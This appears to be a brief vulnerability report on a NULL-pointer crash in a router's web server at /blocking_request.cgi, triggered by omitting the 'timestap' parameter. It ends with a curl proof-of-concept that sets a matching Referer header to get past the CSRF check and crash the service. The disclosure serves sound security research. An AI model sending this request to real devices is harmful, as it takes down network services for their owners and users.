## Vul detail ##

The router starts a httpd service using port 80. In the handler of route `/blocking_request.cgi`, after retrieving the value of parameter `timestap`(which should be a typo), `atol()` is called without checking if it's a NULL pointer.

A NULL pointer reference would be triggered if there's no such parameter in the request, and the web service would crash.

## POC

Since the referer is checked against CSRF, we need to set it to the same as the router's address.

```bash
curl -i -X POST '192.168.20.1/blocking_request.cgi' -H 'Referer: http://192.168.20.1/'
```
